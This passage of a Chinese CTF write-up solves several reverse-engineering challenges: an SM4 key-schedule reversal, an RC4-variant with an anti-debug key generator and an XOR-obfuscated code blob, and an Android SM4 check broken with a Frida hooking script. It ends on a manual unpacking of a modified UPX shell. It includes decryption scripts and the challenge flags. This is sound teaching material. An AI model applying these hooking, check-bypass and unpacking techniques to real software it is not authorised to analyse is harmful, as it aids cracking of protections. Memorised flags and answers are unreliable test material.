    0x1D,0xF6,0xE2,0x2E,0x82,0x66,0xCA,0x60,0xC0,0x29,0x23,0xAB,0x0D,0x53,0x4E,0x6F,
    0xD5,0xDB,0x37,0x45,0xDE,0xFD,0x8E,0x2F,0x03,0xFF,0x6A,0x72,0x6D,0x6C,0x5B,0x51,
    0x8D,0x1B,0xAF,0x92,0xBB,0xDD,0xBC,0x7F,0x11,0xD9,0x5C,0x41,0x1F,0x10,0x5A,0xD8,
    0x0A,0xC1,0x31,0x88,0xA5,0xCD,0x7B,0xBD,0x2D,0x74,0xD0,0x12,0xB8,0xE5,0xB4,0xB0,
    0x89,0x69,0x97,0x4A,0x0C,0x96,0x77,0x7E,0x65,0xB9,0xF1,0x09,0xC5,0x6E,0xC6,0x84,
    0x18,0xF0,0x7D,0xEC,0x3A,0xDC,0x4D,0x20,0x79,0xEE,0x5F,0x3E,0xD7,0xCB,0x39,0x48
]

MASK32 = (1<<32)-1
def u32(x): return x & MASK32

def iterate32_reverse(out_words, rk):
    X = [u32(x) for x in out_words]
    for i in range(31, -1, -1):
        im1=(i-1)&3; ip1=(i+1)&3; ip2=(i+2)&3; idx=i&3
        v3 = u32(rk[i] ^ X[im1] ^ X[ip1] ^ X[ip2])

        b3 = SBOX[(v3>>24)&0xFF]
        b2 = SBOX[(v3>>16)&0xFF]
        b1 = SBOX[(v3>>8 )&0xFF]

        top = (b3<<24)
        v5  = u32(top | (b2<<16))
        v6  = u32(v5  | (b1<<8))

        low_mix = ((rk[i]&0xFF) ^ (X[im1]&0xFF) ^ (X[ip1]&0xFF) ^ (X[ip2]&0xFF)) & 0xFF
        v11 = SBOX[low_mix]

        t = u32(v6 + v11)

        r14 = u32(((t<<32) | v6 ) >> 14)
        r22 = u32(((t<<32) | v5 ) >> 22)
        r30 = u32(((t<<32) | top) >> 30)
        r8  = u32(((v11<<32) | v6) >> 8)

        old = u32(X[idx] ^ t ^ r14 ^ r22 ^ r30 ^ r8)
        X[idx] = old
    return X

def main():
    mm = [0xB60DE9B3, 0x7A7A7B4C, 0xC7D03789, 0x2A278E6C]

    out_words = [mm[3], mm[2], mm[1], mm[0]]

    plain_words = iterate32_reverse(out_words, RK)
    plain_bytes = struct.pack("<4I", *plain_words)

    print("hex:", plain_bytes.hex())
    try:
        print(plain_bytes.decode("utf-8"))
    except:
        print("non-utf8")


if __name__ == "__main__":
    main()
```



##### flag

```
flag{1n1t_@rr@y}
```



### Dancing Functions

##### 解题过程

使用ida反编译程序

![image-20251018210616609](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033155.png)

main函数的逻辑比较简单，把输入加密后与内置的 `Str2` 比较判断

里面比较重要的点在于

```
Block = (void *)KeyGen();
```

生成密钥以及`sub_140001C42(Block, Str1);`这个函数

然后是Str2的内容

![image-20251018212738009](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033928.png)

这里可以确定的是这个就是密文

接着先跟进KeyGen函数查看一下

![image-20251018212835085](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033873.png)

这里跳转到的是

![image-20251018212913065](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033656.png)

 这里用的是MSVCRT 的 `rand()` 序列（Windows CRT 的 LCG），取了一个固定的种子 `0x11451419`

这里查看一下Str的值

![image-20251018213744866](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033740.png)

接着要跟进sub_140001C42()函数，这里应该是加密的过程

![image-20251018214010237](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033306.png)

这个函数把输入字符串按 81 个可用字符的字母表做流加密RC4 变体。主函数传递一个密钥 `a1` 和待处理的缓冲区 `a2`，它会在原地把 `a2` 加密

 字母表`Str`前面已经提取出来了

```
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~"
```

长度 `v9 = 81`。

这里要注意是降序初始化，而不是 RC4 的 `S[i]=i``S[i] = 80 - i`。

接着是在 81 模空间做KSA

```c
v16 = 0;
for j in [0..80]:
    v16 = (v16 + S[j] + (uint8)key[j % keylen]) % 81
    swap(S[j], S[v16])
```

生成 keystream 并加密，和 RC4 不同：

```c
v14 = 0;  // 类似 i
v13 = 0;  // 类似 j
for k in 0..len(a2)-1:
    v14 = (v13 ^ v14) % 81                // 这里用的是“异或”，和 RC4 的 i=(i+1) 不同
    v13 = (v13 + S[v14]) % 81             // j 的更新类似 RC4
    swap(S[v14], S[v13])
    ks = S[( S[v14] ^ S[v13] ) % 81]      // RC4 是 S[(S[i]+S[j])%N]，这里是“按位异或”
    // 把 a2[k] 当成“索引”（0..80）来做加法流：
    a2[k] = Str[ (a2[k] + ks) % 81 ]
```

循环结束后，`a2` 就被替换成了加密后的字符串



到这里程序的主要逻辑大概就理清楚了，但是分析函数的时候注意到程序有一个`I_Can_Run_Before_Main()`

说这个程序可以在main函数之前运行，在这个函数里面发现了控制密钥生成的过程，这里想动调看一下但是程序运行不了

这里发现有调试器的时候， `KeyGen` 被设置成 `sub_1400016DD`。

无调试器时，`KeyGen` 被设置成 `byte_1400017DB`

![image-20251018210538603](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033575.png)

这里有调试器的时候生成的是一个种子数为时间的值

![image-20251018214753351](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033676.png)

所以说这是一个随机的，所以肯定是不对的

看没有调试器的分支跟进是一块数据

![image-20251018214902615](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032033368.png)

这里应该是被故意混淆的，尝试还原这块代码

这段 blob 含有大量 `0xCC`（INT3）填充与数据常量，直接在 IDA 里标为代码会导致无法正常反编或被 IDA 当作数据。要还原出代码，需要把那些 `0xCC`（或长串 CC）视为“填充/占位”，

要还原这块代码就要把这段函数做`XOR 0xCC`

这里在IDA中尝试还原

![image-20251018211218476](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034065.png)

这里代码会报错，但是能还原出来

```python
import ida_bytes
import ida_kernwin
import ida_funcs
import idaapi
import idc


START = 0x1400017DB
END   = 0x1400018D2   

ALPHABET = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~"

ida_kernwin.msg("[*] Starting XOR-decode script\n")

# 1) XOR-decode each byte with 0xCC in the given VA range
for ea in range(START, END + 1):
    try:
        b = ida_bytes.get_byte(ea)
    except Exception:
        # fallback older API name
        b = ida_bytes.get_wide_byte(ea)
    ida_bytes.patch_byte(ea, b ^ 0xCC)
ida_kernwin.msg("[*] XOR 0xCC decode done: 0x%X..0x%X\n" % (START, END))

try:
    # create instruction at start
    idc.create_insn(START)
except Exception:
    try:
        ida_bytes.create_insn(START)
    except Exception:
        ida_kernwin.msg("[!] create_insn not available on this IDA; continue anyway\n")

# create function
try:
    ida_funcs.add_func(START, idaapi.BADADDR)
    ida_kernwin.msg("[*] Created function at 0x%X\n" % START)
except Exception as e:
    ida_kernwin.msg("[!] add_func failed or function likely exists: %s\n" % str(e))

seed = None
ea = START
limit = START + 0x80
while ea < limit:
    try:
        mnem = idc.print_insn_mnem(ea)
    except Exception:
        mnem = ""
    if mnem == "mov":
        # operand 0 text
        op0 = idc.GetOpnd(ea, 0)
        if op0 and op0.lower() in ("ecx", "rcx"):
            try:
                val = idc.get_operand_value(ea, 1)
            except Exception:
                try:
                    val = idc.GetOperandValue(ea, 1)
                except Exception:
                    val = None
            if val is not None:
                # normalize to 32-bit seed if larger
                seed = val & 0xFFFFFFFF
                ida_kernwin.msg("[*] Detected seed immediate at 0x%X: 0x%08X (%d)\n" % (ea, seed, seed))
                break
    ea = idc.next_head(ea, limit)

if seed is None:
    ida_kernwin.msg("[!] Could not auto-detect seed; using fallback 0x00114514\n")
    seed = 0x00114514

# 4) reproduce MSVCRT rand() LCG and generate key
def msvcrt_rand_stream(seed32):
    s = seed32 & 0xFFFFFFFF
    while True:
        s = (s * 214013 + 2531011) & 0xFFFFFFFF
        yield (s >> 16) & 0x7FFF

gen = msvcrt_rand_stream(seed)

# pick length L in [12..16] from rand()%81
L = None
while True:
    v = next(gen) % 81
    if 12 <= v <= 16:
        L = v
        break

key_chars = []
for _ in range(L):
    r = next(gen) % 81
    key_chars.append(ALPHABET[r])

try:
    key = bytes(key_chars).decode('ascii')
except Exception:
    key = repr(bytes(key_chars))

ida_kernwin.msg("[+] Recovered key = %s\n" % key)
ida_kernwin.msg("[*] Done.\n")
```

还原后这个分支的指向也改了

![image-20251018211233982](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034579.png)

现在可以看到这个函数的原本真实的逻辑

![image-20251018211244997](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034177.png)

现在就有一个问题是真实的生成密钥的函数是哪个(这里用过两个密钥解码，后面这个是正确的)

这里问了ai

![image-20251018215716100](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034243.png)

ai说是`.data` 里的 `KeyGen = sub_1400018D2` 只是**初始占位**；真正生效的是 `I_Can_Run_Before_Main` 在 **main 之前**根据反调试结果**重写**过的目标。



还原密钥生成的代码

这里我尝试还原了一下代码，但是运行不出来

```python
#include <stdlib.h>
extern const char Str[];

#define RSTEP(s)  ((s) = 214013u*(s)+2531011u, (((s)>>16)&0x7FFF))

char *sub_1400017DB(void){
    unsigned s = 0x114514u;    
    int v2; do { do v2 = RSTEP(s)%81; while (v2<=11); } while (v2>16);
    char *p = (char*)malloc((size_t)v2 + 1);
    for (int i=0;i<v2;++i) p[i] = Str[ RSTEP(s)%81 ];
    p[v2] = 0; return p;
}

```

让ai帮忙修改了一下，成功还原出key

```python
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

static const char ALPHABET[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  "abcdefghijklmnopqrstuvwxyz"
  "0123456789"
  "!#$%&*+-.<=>?@_{|}~"; 

static uint32_t _msvcrt_seed = 0;

// Emulate srand() for MSVCRT
void srand_msvc(uint32_t s) {
    _msvcrt_seed = s & 0xFFFFFFFFu;
}

int rand_msvc(void) {
    _msvcrt_seed = (uint32_t)((uint64_t)_msvcrt_seed * 214013u + 2531011u);
    return (int)((_msvcrt_seed >> 16) & 0x7FFFu);
}

char *sub_1400017DB_py_like(uint32_t seed) {
    srand_msvc(seed);
    int v2;
    // inner loop: do rand()%81 until >11 (i.e., >=12)
    // outer loop: repeat while v2 > 16 (so final v2 in [12,16])
    do {
        do {
            v2 = rand_msvc() % 81;
        } while (v2 <= 11);
    } while (v2 > 16);

    // allocate buffer length v2 + 1
    char *buf = (char *)malloc((size_t)v2 + 1);
    if (!buf) return NULL;

    for (int i = 0; i < v2; ++i) {
        int idx = rand_msvc() % 81;
        buf[i] = ALPHABET[idx];
    }
    buf[v2] = '\0';
    return buf;
}

int main(int argc, char **argv) {
    uint32_t seed = 0x114514u; // default seed from the reversed code

    if (argc >= 2) {
        // allow override seed by argument (hex or decimal)
        if (argv[1][0] == '0' && (argv[1][1] == 'x' || argv[1][1] == 'X')) {
            seed = (uint32_t)strtoul(argv[1] + 2, NULL, 16);
        } else {
            seed = (uint32_t)strtoul(argv[1], NULL, 10);
        }
    }

    char *key = sub_1400017DB_py_like(seed);
    if (!key) {
        fprintf(stderr, "malloc failed\n");
        return 1;
    }

    printf("seed = 0x%X (%u)\n", seed, seed);
    printf("key  = %s\n", key);

    free(key);
    return 0;
}
```

![image-20251018211823344](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034239.png)

得到密钥，开始还原解密过程，也就是前面的sub_140001C42()函数

用同一密钥跑相同的 KSA/PRGA 得到密钥流，然后把 `Str2` 的每个字符先映射成字母表索引，对每一位执行
 `plain_idx = (cipher_idx - ks) % 81`，最后再映回字符即可得到明文。

由于这是对称流密码，KSA/PRGA 部分完全复现 `sub_140001C42` 的细节（S 盒降序、异或版 PRGA、mod 81）即可；唯一区别在于数据结合方式，加密用“加法流”（`+ ks`）；解密用“减法流”（`- ks`）。



![image-20251018220105906](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034308.png)

##### exp

```python
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~"
key = "ep>nqEIqMA?3H%z"
ciphertext = ".sBtQ=0JEhC#sbw=Q-Y*3h-PGpcvZ9SbU+9F5tH96e>-5hMF"

IDX = {c: i for i, c in enumerate(ALPHABET)}
N = len(ALPHABET)  # 81

def make_keystream(key: str, length: int):
    S = [N - 1 - i for i in range(N)]

    j = 0
    kbytes = [ord(c) for c in key]
    klen = len(kbytes)
    for t in range(N):
        j = (j + S[t] + kbytes[t % klen]) % N
        S[t], S[j] = S[j], S[t]
    i = 0
    j = 0
    ks = []
    for _ in range(length):
        i = (j ^ i) % N
        j = (j + S[i]) % N
        S[i], S[j] = S[j], S[i]
        ks.append(S[(S[i] ^ S[j]) % N])
    return ks

def decrypt(ciphertext: str, key: str) -> str:
    ks = make_keystream(key, len(ciphertext))
    plain_idxs = [(IDX[ch] - k) % N for ch, k in zip(ciphertext, ks)]
    return ''.join(ALPHABET[i] for i in plain_idxs)

if __name__ == "__main__":
    plaintext = decrypt(ciphertext, key)
    print(plaintext)
```



##### flag

```
flag{D4nc1Ng_K3yG3N_fUnct10n5_wItH_r4nD_4Nd_5Mc}
```















### 谁改了我的密钥啊-Revenge

##### 解题过程

先将程序解包

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034190.png)

用jadx打开看

![image-20251019215506101](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034042.png)

![image-20251019215612814](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032034132.png)

java层依旧没有什么有用信息，调用native方法做校验

依旧是逆向so文件

![image-20251019220412758](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035044.png)

![image-20251019220437051](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035971.png)

![image-20251019220035886](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035859.png)

![image-20251019220054488](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035910.png)

S 盒（256 字节）与两种线性变换 `L1/L2`、循环左移等，完全符合 SM4 标准：`functionB` 是字节代换，`functionL1` 与 `functionL2` 分别是数据路径与密钥扩展路径的线性层，`CK`/`FK` 常量表也在 rodata 段。

![image-20251019221840174](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035184.png)

![image-20251019221854963](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035313.png)

![image-20251019221904174](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035830.png)



`FK = A3B1BAC6 56AA3350 677D9197 B27022DC`（little‑end 字节顺序显示）

`CK` 从 `00070E15 … 646B7279` 一共 32 个常量

32 轮迭代与末尾反转输出 `Y = (X35,X34,X33,X32)` 的流程在 `iterate32` 与 `reverse` 中可见。

`JNI_OnLoad` 把 `FirstFragment.checkFlag(String)` 绑定到本地方法 `null_sub`（就是真正的 `checkFlag` 实现）

![image-20251019221721981](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035771.png)

`checkFlag` 做的事是：

取输入字符串的前 **16** 字节，拷到本地缓冲区 `s`（先把 0x20 字节清零，再 `strncpy(..., n=0x10)`）。

用一把 128‑bit 主密钥 `MK` 生成 32 轮密钥（SM4 密钥扩展）。

用 SM4 单块加密 `E(MK, s)` 得到 16 字节输出，与常量明文 `mm` 逐字比较；四个 32 位字全部相等则返回 `true`。debug

接着将关键信息提取出来

![image-20251019220505046](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035610.png)

对比用的目标密文（常量 `mm`）写在 `.data`：
 `mm = F2 CE 36 9F 3C A5 F0 67 7C 5F 46 29 D9 FC 86 24`

主密钥 `MK` 原始在 `.data`，但在初始化函数 `sub_12D0`（由 `.init_array` 调用）里被重写：它把 `kk_ptr`（起始指向 `MK+0x10`）往回挪 0x10，正好指回 `MK`，然后把 `MK[0..3]` 改成 [0, 13, 0, 0],也就是最终生效的 16 字节主密钥

这里尝试还原一下加密逻辑来解密，但是解不出来

写个frida脚本动调尝试还原

直接读出全局常量 `mm`、`MK` 当前内存中的值；

通过 hook `RegisterNatives`/`null_sub` 精确定位到 `checkFlag` 的本地实现，打印你实际输入的字符串与返回结果；

hook `encryptSM4` 拿到实时使用的轮密钥指针 rk、输入块、输出块；

复用库内的 `decryptSM4` + 当前轮密钥，把 `mm` 解密出真正需要的 16 字符，以十六进制和 ASCII 双格式输出（不可见字符用 `.` 显示）；



因为 so 的符号表里就有 `MK`/`mm` 这两个全局变量，JNI 的 `RegisterNatives`、还有字符串 `"checkFlag"` 与 `"work/pangbai/changemykey/FirstFragment"` 等可供解析的符号和字面量

```
PS C:\Users\31989\Desktop\CTF比赛集\NewstarCTF\week3\RE\app-debug\lib\x86_64> frida -U -p 2789 -l changemykey_hook.js
     ____
    / _  |   Frida 16.7.19 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to HBP AL00 (id=127.0.0.1:16416)
Attaching...
[*] Attach OK, waiting for libchangemykey.so
[HBP AL00::PID::2789 ]->
========== lib resolved ==========
[+] base = 0x74eb652e2000
[+] mm = 0x74eb652e6240 , MK = 0x74eb652e6210
[+] enc = 0x74eb652e3870 , dec = 0x74eb652e38b0 , null_sub = 0x74eb652e3990
[+] RegisterNatives = null
[mm] 16B = f2 ce 36 9f 3c a5 f0 67 7c 5f 46 29 d9 fc 86 24  | ASCII: ..6.<..g|_F)...$
[MK] 16B = 00 00 00 00 0d 00 00 00 00 00 00 00 00 00 00 00  | ASCII: ................
[checkFlag] input = "flag{aaaaaaaaaaaa}"

========== encryptSM4 snapshot ==========
[in ] a5 21 41 e0 aa 91 0b 34 62 52 a4 45 40 25 a6 11  | ASCII: .!A....4bR.E@%..
[out] 40 25 a6 11 62 52 a4 45 aa 91 0b 34 a5 21 41 e0  | ASCII: @%..bR.E...4.!A.
[rk ] ptr = 0x7ffcd49a45e0  (dump first 32B): f1 7b 7a 2c 96 4e 69 15 41 ea c6 89 40 45 f6 47 6f 1b f0 d6 6e 28 0d b7 60 44 74 26 a4 0a 78 78

========== DECRYPT(mm) with current rk  ==>  REQUIRED INPUT ==========
[mm ] f2 ce 36 9f 3c a5 f0 67 7c 5f 46 29 d9 fc 86 24
[pt ] 66 6c 61 67 7b 69 6e 31 74 5f 52 65 76 5f 5f 7d  | ASCII: flag{in1t_Rev__}
Hint: 上面 ASCII 行若都是可见字符，就是你要在输入框里敲的 16 个字符。
[checkFlag] ret = 0x0
[checkFlag] input = "flag{in1t_Rev__}"
[checkFlag] ret = 0x1
```

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032035364.png)





##### `frida`脚本

```js
const PKG = "work.pangbai.changemykey";
const LIB = "libchangemykey.so";
const FORCE_TRUE = false;   

function buf2hex(ab) {
  const u = new Uint8Array(ab);
  let s = "";
  for (let i = 0; i < u.length; i++) s += ("0" + u[i].toString(16)).slice(-2);
  return s;
}
function hexWithSpaces(ab) {
  const u = new Uint8Array(ab);
  return Array.from(u, b => ("0" + b.toString(16)).slice(-2)).join(" ");
}
function readHex(ptr, len) { return buf2hex(Memory.readByteArray(ptr, len)); }
function readHexSp(ptr, len) { return hexWithSpaces(Memory.readByteArray(ptr, len)); }
function readAscii(ptr, len) {
  let s = "";
  for (let i = 0; i < len; i++) {
    const c = Memory.readU8(ptr.add(i));
    s += (c >= 0x20 && c <= 0x7e) ? String.fromCharCode(c) : ".";
  }
  return s;
}
function findSym(nameOrSubstr) {
  let a = Module.findExportByName(LIB, nameOrSubstr);
  if (a) return a;
  const syms = Module.enumerateSymbolsSync(LIB).filter(s => s.name.indexOf(nameOrSubstr) !== -1);
  return syms.length ? syms[0].address : null;
}
function logTitle(s) { console.log("\n========== " + s + " =========="); }

function jstringToString(jstr) {
  const env = Java.vm.getEnv();
  const isCopy = Memory.alloc(1);
  const cstr = env.getStringUtfChars(jstr, isCopy);
  const js = Memory.readCString(cstr);
  env.releaseStringUtfChars(jstr, cstr);
  return js;
}

function whenLibReady() {
  const base = Module.findBaseAddress(LIB);
  if (!base) return;
  Module.ensureInitialized(LIB);

  const mm = findSym("mm");
  const MK = findSym("MK");
  const encryptSM4 = findSym("_Z10encryptSM4PjS_S_");
  const decryptSM4 = findSym("_Z10decryptSM4PjS_S_");
  const null_sub = findSym("null_sub"); 
  const jniReg = Module.findExportByName(null, "_ZN7_JNIEnv15RegisterNativesEP7_jclassPK15JNINativeMethodi")
                 || Module.findExportByName("libart.so", "_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi")
                 || null;

  logTitle("lib resolved");
  console.log("[+] base =", base);
  console.log("[+] mm =", mm, ", MK =", MK);
  console.log("[+] enc =", encryptSM4, ", dec =", decryptSM4, ", null_sub =", null_sub);
  console.log("[+] RegisterNatives =", jniReg);

  if (mm) {
    console.log("[mm] 16B =", readHexSp(mm, 16), " | ASCII:", readAscii(mm, 16));
  }
  if (MK) {
    console.log("[MK] 16B =", readHexSp(MK, 16), " | ASCII:", readAscii(MK, 16));
  }

  if (jniReg) {
    Interceptor.attach(jniReg, {
      onEnter(args) {
        this.methods = args[2];
        this.n = args[3].toInt32();
      },
      onLeave(retval) {
        try {
          for (let i = 0; i < this.n; i++) {
            const entry = this.methods.add(i * (Process.pointerSize * 3));
            const namePtr = Memory.readPointer(entry);
            const sigPtr  = Memory.readPointer(entry.add(Process.pointerSize));
            const fnPtr   = Memory.readPointer(entry.add(Process.pointerSize * 2));
            const name = Memory.readCString(namePtr);
            const sig  = Memory.readCString(sigPtr);
            console.log(`[RegisterNatives] ${name} ${sig} -> ${fnPtr}`);
            if (name === "checkFlag") hookCheckFlag(fnPtr);
          }
        } catch (e) {}
      }
    });
  }

  if (null_sub) hookCheckFlag(null_sub);

  if (encryptSM4 && decryptSM4 && mm) {
    const dec = new NativeFunction(decryptSM4, 'void', ['pointer', 'pointer', 'pointer']);
    let dumpedOnce = false;
    Interceptor.attach(encryptSM4, {
      onEnter(args) {
        this.in = args[0]; 
        this.rk = args[1]; 
        this.out = args[2]; 
      },
      onLeave(retval) {
        if (!dumpedOnce) {
          dumpedOnce = true;
          logTitle("encryptSM4 snapshot");
          console.log("[in ]", readHexSp(this.in, 16), " | ASCII:", readAscii(this.in, 16));
          console.log("[out]", readHexSp(this.out, 16), " | ASCII:", readAscii(this.out, 16));
          console.log("[rk ] ptr =", this.rk, " (dump first 32B):", readHexSp(this.rk, 32));

          const inbuf = Memory.alloc(16);
          const outbuf = Memory.alloc(16);
          Memory.copy(inbuf, mm, 16);
          dec(inbuf, this.rk, outbuf);

          logTitle("DECRYPT(mm) with current rk  ==>  REQUIRED INPUT");
          console.log("[mm ]", readHexSp(mm, 16));
          console.log("[pt ]", readHexSp(outbuf, 16), " | ASCII:", readAscii(outbuf, 16));
          console.log("Hint: 上面 ASCII 行若都是可见字符，就是flag。");
        }
      }
    });
  }
}

function hookCheckFlag(fnPtr) {
  if (!fnPtr) return;
  Interceptor.attach(fnPtr, {
    onEnter(args) {
      this.jstr = args[2];
      try {
        Java.performNow(() => {
          const s = jstringToString(this.jstr);
          console.log(`[checkFlag] input = "${s}"`);
        });
      } catch (e) {
        console.log("[checkFlag] <failed to read jstring>", e);
      }
    },
    onLeave(retval) {
      console.log("[checkFlag] ret =", retval);
      if (FORCE_TRUE) {
        retval.replace(ptr(1));
        console.log("[checkFlag] ret forced to TRUE");
      }
    }
  });
}

function hookDlopenAndRun() {
  const h1 = Module.findExportByName(null, "android_dlopen_ext");
  const h2 = Module.findExportByName(null, "dlopen");
  const cb = {
    onEnter(args) {
      this.path = args[0] ? Memory.readCString(args[0]) : "";
    },
    onLeave(retval) {
      if (this.path.indexOf(LIB) !== -1) {
        setTimeout(whenLibReady, 200); 
      }
    }
  };
  if (h1) Interceptor.attach(h1, cb);
  if (h2) Interceptor.attach(h2, cb);

  if (Module.findBaseAddress(LIB)) setTimeout(whenLibReady, 200);
}

Java.perform(() => {
  console.log("[*] Attach OK, waiting for", LIB);
  hookDlopenAndRun();
});
```



##### flag

```
flag{in1t_Rev__}
```



### 尤皮·埃克斯历险记（2）

##### 解题过程

查看文件信息

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036298.png)

发现程序有壳，用UPX尝试脱壳

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036085.png)

UPX脱不了壳，用DiE再看一下

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036633.png)

是UPX类型的壳，但是标志位被修改为HOMO

尝试手动脱壳

用x64dbg打开程序，先单步跟进尝试找一下OEP

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036271.png)

程序在这里大量循环调用api

继续走

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036416.png)

这里跑了一遍程序了解大致流程

开始脱壳，这里可以看到系统断点

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036496.png)

按F9运行至断点处，到第一个断点TLS回调函数1

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036018.png)

接着走，到系统的入口断点处

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032036349.png)

f7步进完压栈内容至lea指令处

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037575.png)

这里可以看到rsp位置改变了，找到rsp对应位置下硬件断点

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037634.png)

接着f9可以看到pop和1.exe程序对应的函数调用，中间的jne循环用于补齐缺失的栈段空间

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037517.png)

下断点运行至jmp处然后步进

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037721.png)

可以看到进入源程序内部了，使用Scylla dump

填OEP的起始地址

然后IAT自动搜索/IAT Autosearch，接着获取导入/Get Imports，然后删除红叉所在行；最后转储/Dump

还需要修复转储/Fix Dump 选择dump的文件即可

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037439.png)

使用IDA打开修复后的dump文件

打开没有找到程序的关键入口，直接按shift+f12查看字符串，找到程序的入口

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037258.png)

跟进

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037753.png)

![image-20251019211542701](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037960.png)

程序读取输入到 `Str`

调用 `sub_7FF799A717CC((__int64)Str, Size, (__int64)Block);` —— 这个函数应该就是关键：这个函数把 `Str` 转换/解码/处理为 `Block`

程序把 `Block` 的前 48 字节逐字节与内存中存放的常量 `qword_7FF799A75140`比较。

先查看一下这个常量

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037151.png)

接着跟进`sub_7FF799A717CC`函数

![image-20251019211910352](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037431.png)

输入：`a1=Str`，长度 `a2`（题目要求 48）。

把 `Str` **按 4 字节小端**打包成 `Count=ceil(a2/4)` 个 32 位整数（不足 4 字节的最后一组按真实字节数拼成）。

以 **3 个 32 位为一组**做分组（`v14=ceil(Count/3)` 组）。

对每组做一个 75 长度的“扩展序列”：

给定初始 `v8[0..2]` = 这一组的 3 个 32 位（不足的补 0）。

用 72 轮递推生成 `v8[3..74]`：

```
t  = v8[n] ^ S( v8[n+2] ^ v8[n+1] ^ K[n] )
v8[n+3] = S( t )
```

其中 `S = sub_7FF799A71450`，`K[n] = ((DWORD*)qword_7FF799A75000)[n]`（72 个 32 位常量）。

取该组输出 `out_g[0..2] = v8[72..74]`。

链式异或类似 CBC，把所有组的输出 `out_g` 链起来得到 `v12`，规则：

- 第 0 组：`v12[i] = out_g[i] ^ IV[i]`，其中 `IV = *((DWORD*)sub_7FF799A75120)[0..2]`
- 第 j(>0) 组：`v12[3j + k] = out_g[k] ^ v12[3(j-1) + k]`

- 把 `v12` 写成字节（小端）得到 `a3`，主函数用它的前 48 字节去跟 `qword_7FF799A75140` 比较。

这里的 `qword_7FF799A75140` 有 6 个 `dq`（6×8=48 字节），正好就是期望的输出字节序列。

先把这里的常量`K`提取出来

![image-20251019212132014](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032037536.png)

这里的`sub_7FF799A75120`理论上应该是一个常量，但是这里跟进是一个函数

![image-20251019212440083](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603032038022.png)

这里应该是被壳/编译器伪造成函数了，实际上在主程序中它只是被当作一个地址常量使用。

在 `sub_7FF799A717CC` 里的语句是：

```c
*((_DWORD *)v12 + v11 - 3);
else
    v7 = *v6 ^ *((_DWORD *)sub_7FF799A75120 + kk);
```

也就是说，`sub_7FF799A75120` 在这里并没有被调用，只是拿它的地址当成一个 `int[3]` 的起始地址。
 反编译器因为符号表或自动命名，把那个地址标成了 `sub_7FF799A75120()`，实际上那段看似的函数体（只有 `_InterlockedExchange` 一句）很可能是个误识别的伪函数，真正的 12 个字节数据就在这块地址里，

这里在`x64dbg`中跳转到内存中这个位置看一下

